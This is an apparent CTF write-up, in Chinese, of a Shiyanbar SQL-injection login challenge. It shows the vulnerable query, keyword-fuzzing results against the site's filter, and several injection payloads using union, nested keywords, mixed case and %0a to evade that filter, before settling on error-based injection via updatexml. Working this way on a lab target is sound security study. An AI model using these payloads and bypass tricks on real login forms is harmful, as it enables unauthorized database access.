# 加了料的报错注入

## 题目

> http://ctf5.shiyanbar.com/web/baocuo/index.php
>
>
> Please login! tips:post username and password... 

分类：`sql injection` `sql语句已知`

## 流程图

## 解题步骤

#### 参考文章

无

#### 步骤

##### 0x1 查看源文件

```mysql
 $sql="select * from users where username='$username' and password='$password'";  
```

所以，应该post提交username和password字段

##### 0x2 常规测试 

1. 在hackbar中提交正常值

```mysql
username=admin&password=admin
```

返回

> ## Login failed

2. 常规测试

   1. `''`

      ```mysql
      username=admin'&password=admin
      ```

      返回

      > You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near 'admin''  at line 1 

      说明存在sql注入，字符型

   2. `' and 1=1#`

      ```mysql
      username=admin' and 1=1#&password=admin
      ```

      返回

      > # Sql injection detected

   3. 发现有sql注入检测，bp跑一下

      > Request	Payload	Length
      > 40	(	270
      > 41	)	270
      > 59	,	270
      > 3	substr	273
      > 4	sleep	273
      > 7	union	273
      > 11	limit	273
      > 15	order by	273
      > 29	mid	273
      > 30	ord	273
      > 26	rand	273
      > 34	#	273
      > 44	-	273
      > 45	=	273
      > 53	;	273
      > 2	to	337
      > 0		337
      > 1	for	337
      > 6	select	337
      > 8	concat	337
      > 9	or	337
      > 5	ExtractValue	337
      > 10	and	337
      > 13	||	337
      > 14	group by	337
      > 12	&&	337
      > 16	into outfile	337
      > 17	into	337
      > 18	into dumpfile	337
      > 19	having	337
      > 20	where	337
      > 22	update	337
      > 23	delete	337
      > 21	insert	337
      > 24	updatexml	337
      > 25	if	337
      > 27	from	337
      > 28	information_schema	337
      > 32	!	337
      > 33	@	337
      > 31	~	337
      > 35	$	337
      > 36	%	337
      > 37	^	337
      > 38	&	337
      > 39	*	337
      > 42	_	337
      > 43	+	337
      > 46	[	337
      > 48	{	337
      > 49	}	337
      > 47	]	337
      > 51	|	337
      > 52	:	337
      > 54	"	337
      > 56	<	337
      > 57	>	337
      > 58	?	337
      > 61	/	337
      > 62	`	337
      > 60	.	337    
      >
      > 50	\	360
      > 55	'	360

      有三种情况:

      270:`User name unknow error.`

      273:`Sql injection detected`

      337: `Login failed`

      360:`You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near 'admin''  at line 1 ` 

   4. sql语句为

      ```mysql
       $sql="select * from users where username='$username' and password='$password'";
      ```

      构造查询语句

      ```mysql
      admin' union select 1 where 't'='t
      ```

      ~~双重sql语句测试~~（只能用于过滤，不能用于检测到即报错的情况）

      ```mysql
      admin' unionunion select 1 where 't' regexp 't
      ```

      ~~被检测到，使用嵌套双重sql~~（同上）

      ```mysql
      admin' ununionion select 1 where 't' regexp 't
      ```

      仍然被检测到，使用大小写

      ```mysql
      admin' Union select 1 where 't' regexp 't
      ```

      仍然被检测到，修改空格字符为`%0a`

      ```mysql
      admin'%0aUnion%0aselect%0a1%0awhere%0a't'%0aregexp%0a't
      ```

      仍然被检测到，考虑报错注入；

##### 0x3 报错注入

   查看username字段中`updatexml`未被过滤，但是`（）`被过滤掉了，再fuzz一下`password`

> Request	Payload	Length
> 0		337
> 1	regexp	337
> 2	like	273
> 3	between	337
> 4	for	337
> 5	to	337
> 6	substr	273
> 7	sleep	273
> 8	ExtractValue	270
> 9	select	337
> 10	union	273
> 11	concat	337
> 12	or	337
> 13	and	337
> 14	limit	273
> 15	&&	337
> 16	||	337
> 17	group by	337
> 18	order by	273
> 19	into outfile	337
> 20	into	337
> 21	into dumpfile	337
> 22	having	337
> 23	where	337
> 24	insert	337
> 25	update	337
> 26	delete	337
> 27	updatexml	270
> 28	if	337
> 29	rand	273
> 30	from	337
> 31	information_schema	337
> 32	mid	273
> 33	ord	273
> 34	~	337
> 35	!	337
> 36	@	337
> 37	#	273
> 38	$	337
> 39	%	337
> 40	^	337
> 41	&	337
> 42	*	337
> 43	(	337
> 44	)	337
> 45	_	337
> 46	+	337
> 47	-	273
> 48	=	273
> 49	[	337
> 50	]	337
> 51	{	337
> 52	}	337
> 53	\	357
> 54	|	337
> 55	:	337
> 56	;	273
> 57	"	337
> 58	'	357
> 59	<	337
> 60	>	337
> 61	?	337
> 62	,	337
> 63	.	337
> 64	/	337
> 65	`	337

发现`()`没有被过滤，可以使用报错注入


## 漏洞挖掘思路

- 无

## 自动化解析

- TODO

- 设定题目难度等级`level`为
- 提交相应符合要求的字符串

